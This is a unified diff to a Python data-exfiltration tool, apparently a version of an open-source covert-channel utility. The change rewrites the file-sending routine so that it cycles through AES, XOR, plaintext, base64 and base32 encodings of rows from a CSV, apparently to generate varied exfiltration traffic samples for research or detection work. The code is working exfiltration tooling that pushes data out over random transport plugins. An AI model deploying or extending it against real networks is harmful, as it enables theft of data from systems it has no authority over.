@@ -15,8 +15,11 @@ from random import randint
 from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
+from Crypto.Cipher import XOR
 from zlib import compress, decompress
 from plugins import dukpt
+import base64
+import csv
 
 try:
     from cStringIO import StringIO
@@ -84,7 +87,7 @@ def aes_encrypt(message, key=KEY):
         pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
 
         # Return data size, iv and encrypted message
-        return iv + ksn + aes.encrypt(pad(message))
+        return aes.encrypt(pad(message))
     except:
         return None
 
@@ -295,15 +298,6 @@ class ExfiltrateFile(threading.Thread):
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
 
-        warning("[!] Registering packet for the file")
-        data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
-        plugin_send_function(data)
-
-        time_to_sleep = randint(1, MAX_TIME_SLEEP)
-        info("Sleeping for %s seconds" % time_to_sleep)
-        time.sleep(time_to_sleep)
-
         # sending the data
         f = tempfile.SpooledTemporaryFile()
         data = e.read()
@@ -314,30 +308,53 @@ class ExfiltrateFile(threading.Thread):
         e.close()
 
         packet_index = 0
-        while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
-            if not data_file:
-                break
-            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-            ok("Using {0} as transport method".format(plugin_name))
-            # info("Sending %s bytes packet" % len(data_file))
+        maximum = 43000
+        methods = [ #8600 each
+            'aes',
+            'xor',
+            'plaintext',
+            'b64',
+            'b32'
+        ]
+        file = open('etc/exfiltration_data.csv', 'rb')
+        reader = csv.reader(file)
+        for method in methods:
+            while (True):
+                if method == 'aes':
+                    data_file = base64.standard_b64encode(f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)))
+                elif method == 'xor':
+                    unencrypted = next(reader)[0]
+                    key = "abcdefghijklmnopqrstuvwxqzabcdefghijklmnopqrstuvwxqzabcdefghijklmnopqrstuvwxqzabcdefghijklmnopqrstuvwxqz"
+                    xor_cipher = XOR.new("".join(random.sample(key, 20)))
+                    data_file = base64.b32encode(xor_cipher.encrypt(unencrypted)).lower()
+                elif method == 'plaintext':
+                    data_file = next(reader)[0]
+                elif method == 'b64':
+                    unencoded = next(reader)[0]
+                    data_file = base64.standard_b64encode(unencoded)
+                elif method == 'b32':
+                    unencoded = next(reader)[0]
+                    data_file = base64.b32encode(unencoded).lower()
+                else:
+                    break
 
-            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
-            plugin_send_function(data)
-            packet_index = packet_index + 1
+                while data_file[-1] == '=':
+                    data_file = data_file[:len(data_file) - 1]
 
-            time_to_sleep = randint(1, MAX_TIME_SLEEP)
-            display_message("Sleeping for %s seconds" % time_to_sleep)
-            time.sleep(time_to_sleep)
+                plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+                ok("Using {0} as transport method with method {1} : {2} ".format(plugin_name, method, packet_index))
 
-        # last packet
-        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-        ok("Using {0} as transport method".format(plugin_name))
-        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
-        plugin_send_function(data)
-        f.close()
-        sys.exit(0)
-
+                data = data_file
+                try:
+                    plugin_send_function(data)
+                except Exception as e:
+                    print(e)
+                    print("EXCEPTION! - skipping packet and not counting it...")
+                packet_index = packet_index + 1
+                if packet_index % 2 == 0:
+                    time.sleep(10)
+                    print("\n\n")
+                    break
 
 def signal_handler(bla, frame):
     global threads
